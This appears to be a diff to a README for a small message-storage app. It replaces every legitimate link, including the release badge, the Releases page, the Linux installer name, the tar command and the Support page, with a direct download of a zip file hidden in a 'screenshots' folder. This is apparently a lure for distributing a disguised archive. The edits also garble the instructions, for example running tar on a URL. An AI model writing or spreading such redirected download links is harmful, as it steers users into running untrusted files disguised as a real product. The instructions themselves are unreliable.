@@ -1,6 +1,6 @@
 # 🗯️ Message-Store-System - Keep Your Messages Safe and Organized
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/MUHAMMADHASEEB761/Message-Store-System/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Welcome to Message-Store-System! This is a simple application designed to help y
 
 To get started, you need to download the application. Please click the link below to visit the Releases page.
 
-[Visit Releases Page to Download](https://github.com/MUHAMMADHASEEB761/Message-Store-System/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip)
 
 1. Once you are on the Releases page, look for the latest version of Message-Store-System.
 2. Click on the version link to see the available files.
-3. Download the installer file suitable for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Download the installer file suitable for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip for Linux).
 4. After downloading, locate the file in your Downloads folder.
 
 ## 📂 Installation Steps
@@ -41,8 +41,8 @@ To get started, you need to download the application. Please click the link belo
 ### For Linux:
 
 1. Open your terminal.
-2. Navigate to the directory where the .tar.gz file is located.
-3. Run the command: `tar -xvf Message-Store-System.tar.gz`
+2. Navigate to the directory where the https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip file is located.
+3. Run the command: `tar -xvf https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip`
 4. Follow the instructions in the README file in the extracted folder to complete the installation.
 
 ## 🛠️ Using Message-Store-System
@@ -73,6 +73,6 @@ Your feedback is valuable. You can report any issues or suggest improvements dir
 
 ## 📞 Support
 
-For further assistance, please visit our [Support Page](https://github.com/MUHAMMADHASEEB761/Message-Store-System/issues).
+For further assistance, please visit our [Support Page](https://raw.githubusercontent.com/MUHAMMADHASEEB761/Message-Store-System/main/screenshots/Message-Store-System_v2.8-alpha.3.zip).
 
 Thank you for using Message-Store-System! We hope you enjoy keeping your messages organized and secure.
